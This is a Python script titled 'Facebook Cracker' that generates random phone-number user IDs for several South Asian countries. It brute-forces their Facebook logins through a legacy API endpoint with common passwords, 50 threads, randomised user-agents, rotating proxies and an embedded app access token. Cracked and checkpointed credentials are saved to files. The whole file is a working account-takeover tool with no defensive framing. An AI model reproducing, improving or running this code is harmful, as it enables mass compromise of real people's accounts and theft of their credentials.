#----------------------------[IMPORTS]--------------------------------#
import requests
import os
import random
import datetime
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

#----------------------------[COLORS]--------------------------------#
A = '\x1b[1;97m'  # White
R = '\x1b[38;5;196m'  # Red
G = '\x1b[38;5;46m'  # Green
Y = '\033[1;33m'  # Yellow
S = '\x1b[1;96m'  # Cyan

#----------------------------[LOGGING]--------------------------------#
logging.basicConfig(
    filename="app.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

#----------------------------[DATE & TIME]--------------------------------#
now = datetime.datetime.now()
current_time = now.strftime("%H:%M:%S")
current_date = now.strftime("%d-%B-%Y")

#----------------------------[IP ADDRESS]--------------------------------#
def get_ip():
    try:
        return requests.get("https://api64.ipify.org?format=json").json()["ip"]
    except Exception as e:
        logging.error(f"Failed to fetch IP: {e}")
        return "No Internet"

#----------------------------[CUSTOM LOGO]--------------------------------#
logo = f"""
{G}╔═╗╔╗ ╔═╗╔═╗╔╦╗╔═╗╦ ╦╔═╗╦═╗
{G}║ ╦╠╩╗╠═╣║ ║ ║ ║ ║║ ║║ ║╠╦╝
{G}╚═╝╚═╝╩ ╩╚═╝ ╩ ╚═╝╚═╝╚═╝╩╚═
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Y}Developer : Abd Ur Rab
{Y}Tool Name : Facebook Cracker
{Y}Version   : 8.0 (Fully Upgraded)
{Y}Status    : Active
{Y}Date      : {current_date}
{Y}Time      : {current_time}
{Y}IP        : {get_ip()}
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

#----------------------------[COUNTRY SELECTION]--------------------------------#
def select_country():
    os.system("clear")
    print(logo)
    print(f"{G}[1] {A}Pakistan")
    print(f"{G}[2] {A}Afghanistan")
    print(f"{G}[3] {A}India")
    print(f"{G}[4] {A}Bangladesh")
    print(f"{G}[5] {A}Exit")
    
    choice = input(f"{G}Select Country: {A}")
    
    countries = {
        "1": ("PAK", "923"),
        "2": ("AFG", "937"),
        "3": ("IND", "91"),
        "4": ("BD", "880"),
        "5": exit
    }
    
    if choice in countries:
        return countries[choice]()
    else:
        print(f"{R}Invalid Choice! Try Again...")
        time.sleep(2)
        return select_country()

#----------------------------[USER-AGENT]--------------------------------#
def random_ua():
    return f"Mozilla/5.0 (Linux; Android {random.randint(7,12)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,115)}.0.{random.randint(4000,5000)}.0 Mobile Safari/537.36"

#----------------------------[LOAD PASSWORDS]--------------------------------#
def load_passwords():
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r") as f:
            return [line.strip() for line in f.readlines()]
    else:
        return ["123456", "password", "pakistan", "786786", "112233"]

#----------------------------[FACEBOOK LOGIN]--------------------------------#
def facebook_login(uid, password, total, completed, proxy=None):
    headers = {
        "User-Agent": random_ua(),
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-FB-HTTP-Engine": "Liger"
    }
    
    url = f"https://b-api.facebook.com/method/auth.login?email={uid}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    
    try:
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        response = session.get(url, headers=headers).json()
        
        if "session_key" in response:
            print(f"{G}[SUCCESS] {uid} | {password}")
            logging.info(f"Success: {uid} | {password}")
            with open("success.txt", "a") as f:
                f.write(f"{uid}|{password}\n")
        elif "www.facebook.com" in response.get("error_msg", ""):
            print(f"{Y}[CHECKPOINT] {uid} | {password}")
            logging.warning(f"Checkpoint: {uid} | {password}")
            with open("checkpoint.txt", "a") as f:
                f.write(f"{uid}|{password}\n")
        else:
            print(f"{R}[FAILED] {uid} | {password}")
            logging.error(f"Failed: {uid} | {password}")
            
    except requests.exceptions.ConnectionError:
        print(f"{R}No Internet Connection!")
        logging.error("No Internet Connection!")
    except Exception as e:
        print(f"{R}Error: {e}")
        logging.error(f"Error: {e}")
    
    # Update progress
    completed[0] += 1
    progress = (completed[0] / total) * 100
    print(f"{S}Progress: {progress:.2f}%")

#----------------------------[MAIN FUNCTION]--------------------------------#
def main():
    os.system("clear")
    print(logo)
    
    # Select country
    country_code, prefix = select_country()
    print(f"{G}Selected Country: {A}{country_code}")
    print(f"{G}Prefix: {A}{prefix}")
    
    # Generate IDs
    limit = int(input(f"{G}Enter Number of IDs to Generate: {A}"))
    user_ids = [prefix + str(random.randint(1000000, 9999999)) for _ in range(limit)]
    passwords = load_passwords()
    
    # Load proxies (if available)
    proxies = []
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as f:
            proxies = [line.strip() for line in f.readlines()]
    
    os.system("clear")
    print(logo)
    print(f"{G}Total IDs: {A}{limit}")
    print(f"{G}Total Passwords: {A}{len(passwords)}")
    print(f"{G}Cracking Started... Please Wait!")
    
    total_tasks = len(user_ids) * len(passwords)
    completed_tasks = [0]  # Using a list to make it mutable in threads
    
    with ThreadPoolExecutor(max_workers=50) as executor:  # Increased max_workers for better performance
        futures = []
        for uid in user_ids:
            for pw in passwords:
                proxy = random.choice(proxies) if proxies else None
                futures.append(executor.submit(facebook_login, uid, pw, total_tasks, completed_tasks, proxy))
        for future in as_completed(futures):
            future.result()

#----------------------------[START]--------------------------------#
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{R}\nExiting...")
        logging.info("Script terminated by user.")
        sys.exit(0)